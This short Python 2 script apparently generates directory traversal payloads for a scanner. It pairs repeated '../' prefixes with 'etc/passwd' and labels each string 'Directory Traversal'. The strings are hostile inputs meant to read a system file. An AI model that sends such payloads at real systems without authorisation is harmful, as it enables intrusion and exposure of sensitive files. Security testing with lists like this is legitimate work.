
import itertools

def get_all():
	paths = []
	dotvar = "../"
	depth_count= 8
	for i in range(1, depth_count):
		paths.append(i* dotvar)

	payload = "etc/passwd"

	payloads = [(item + payload, "Directory Traversal") for item in paths]
	return payloads
	
if __name__ == "__main__":	
	print get_all()
